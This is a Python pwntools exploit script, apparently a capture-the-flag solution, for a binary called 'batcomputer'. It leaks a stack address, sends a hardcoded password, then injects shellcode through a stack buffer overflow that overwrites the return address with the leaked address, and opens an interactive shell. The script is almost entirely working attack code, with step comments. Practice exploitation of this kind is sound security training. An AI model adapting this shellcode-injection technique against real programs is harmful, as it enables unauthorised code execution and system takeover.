#!/usr/bin/python3

from pwn import *

#Step 0 - Setting up the binary
context.log_level = 'DEBUG'
context(os='linux',arch='amd64')
binary = './batcomputer'
io = process(binary) #Input Output process
#io = remote(IP,PORT) #Remote connection

#Step 1 - Binary enumeration
password = 'b4tp@$$w0rd!'
rsp_offset = 84

#Step 2 - Leak stack address for the buffer overflow
io.sendlineafter('>','1')
leaked_stack_address = io.recvline().strip().split()[-1] #Get stack address from the binary
leaked_stack_address = [chr(int(leaked_stack_address[i:i+2],16))for i in range(2,len(leaked_stack_address),2)] #Splitting into chars
leaked_stack_address = ''.join(leaked_stack_address) #Joining them together
leaked_stack_address = leaked_stack_address.rjust(8,'\x00') #Make sure our address is 8 bytes
leaked_stack_address = u64(leaked_stack_address,endian='big') #Unpacking to int for further manipulation as big endian
log.success(f'Leaked stack address is at: {p64(leaked_stack_address)}')

#Step 3 - Buffer overflow
io.sendlineafter('>','2')
io.sendlineafter('password:',password)

shellcode = asm(shellcraft.popad() + shellcraft.sh()) #Crafting shellcode plus poping all the registers for stack space
padding = b'A' * (rsp_offset - len(shellcode)) #Padding the payload 
payload = shellcode + padding + p64(leaked_stack_address) #Payload

io.sendlineafter('commands:',payload) #Injecting our payload
io.sendlineafter('>','3') #Triggering the program to stop and return to our stack address

io.interactive() #Interactive mode 